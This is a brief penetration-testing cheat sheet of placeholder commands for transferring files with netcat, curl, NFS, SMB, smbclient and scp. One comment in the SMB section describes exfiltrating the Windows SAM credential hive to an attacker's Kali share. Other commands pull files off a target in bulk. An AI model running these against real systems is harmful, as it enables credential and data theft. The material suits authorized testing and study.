# Unix File Transfers

## Netcat

##### start listener on target
```sh
nc -nlvp [PORT] > [RECIVING.FILE]
```
##### send the file
```
nc [IP] [PORT] < [SENDING.FILE]
```

## Curl

```sh
curl -F "upload=@[FILE]" https://[IP]/[FILE]
```

```
curl -o [FILE] https://[IP]/[FILE]
```


## NFS Shares

```sh
sudo mkdir -p /mnt/share1
mount -t nfs -o vers=3 [IP]:/[FOLDER]/ /mnt/[SHARE]
```
```sh
sudo mkdir -p /mnt/share1
mount -t nfs -o vers=2 [REMOTE_IP]:/home/ /mnt/[SHARE]
```
##### Unmount
```sh
sudo umount /mnt/[SHARE]
```
##### Mount at Boot
```sh
[IP]:/[SHARE]/[FOLDER]  /mnt/[SHARE]  nfs  defaults,vers=3  0  0
```


## SMB Shares

##### Mount SMB Share
```sh
sudo mount -t cifs -o vers=1.0 //[REMOTE_IP]/'[SHARE]' /mnt/[SHARE]
```
##### Host SMB Share
```sh
sudo impacket-smbserver [SHARE] .
# to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\share\sam.save
```
##### Upload from Target
```
copy C:\Path\To\[FILE] \\[IP]\[SHARE]\[FILE]
```
##### Upload with curl to Target
```sh
curl --upload-file /Path/To/[FILE] -u 'DOMAIN\[USER]' smb://[IP]/[SHARE]/
```
##### Use smbclient to Get ALL files from an SMB share
```sh
smbclient //[IP]/[SHARE]
RECURSE ON
PROMPT OFF
mget *
```

### SCP
##### Copy TO Remote Machine
```sh
scp /[LOCAL_PATH]/[FILE] [USER]@[IP]:/[REMOTE_PATH]/[FILE]
```

##### Copy FROM Remote Machine
```sh
scp [USER]@[IP]:/[REMOTE_PATH]/[FILE] /[LOCAL_PATH]/[FILE]
```